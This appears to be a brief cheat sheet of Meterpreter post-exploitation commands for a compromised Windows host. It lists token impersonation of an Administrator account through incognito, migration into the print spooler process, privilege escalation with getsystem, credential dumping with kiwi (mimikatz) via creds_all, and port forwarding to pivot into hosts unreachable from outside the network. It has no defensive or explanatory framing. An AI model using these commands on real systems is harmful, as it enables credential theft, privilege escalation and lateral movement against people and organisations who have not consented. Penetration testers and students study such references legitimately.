### incognito 
```
mtr> load incognito
mtr> list_tokens -u
mtr> impersonate_token APT\\Administrator
```

### drop token
```
mtr> drop_token
```

### migrate to x64 process
```
mtr> ps
mtr> migrate <spoolId>
```

### get user id
```
mtr> getuid
```

### mimikatz
```
mtr> getsystem
mtr> load kiwi
mtr> creds_all
```

### port forwarding - the target ip is the host whih can not be reached from the outside of the network
```
mtr> portfwd add –l <listenPort> –p <remotePort> –r <rhost>
```

